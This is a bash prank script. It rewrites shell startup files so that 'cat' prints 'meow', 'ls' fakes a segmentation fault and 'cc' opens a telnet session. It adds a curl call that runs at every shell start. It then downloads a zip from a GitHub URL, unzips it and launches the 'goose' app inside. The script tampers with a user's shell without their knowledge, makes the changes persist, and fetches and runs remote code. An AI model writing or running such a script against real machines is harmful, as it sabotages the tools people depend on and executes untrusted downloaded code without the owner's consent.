#!/bin/bash

add_alias() {
    local alias_command="$1"
    local alias_file="$2"
    if ! grep -q "$alias_command" "$alias_file"; then
        echo "$alias_command" >> "$alias_file"
        echo "Added: $alias_command"
    else
        echo "Alias '$alias_command' already exists in $alias_file"
    fi
}

add_alias "alias cat='printf \"meow\n\"'" ~/.bash_aliases
add_alias "alias cat='printf \"meow\n\"'" ~/.zshrc

add_alias "alias ls='echo \"Segmentation fault\"'" ~/.bash_aliases
add_alias "alias ls='echo \"Segmentation fault\"'" ~/.zshrc

add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.bash_aliases
add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.zshrc

add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.bashrc
add_alias "curl -s https://uselessfacts.jsph.pl/random.txt?language=en | sed 's/.*: //'" ~/.zshrc

curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip'
unzip -o ~/goose.zip -d ~/goose
open ~/goose/goose.app

echo "Done!"
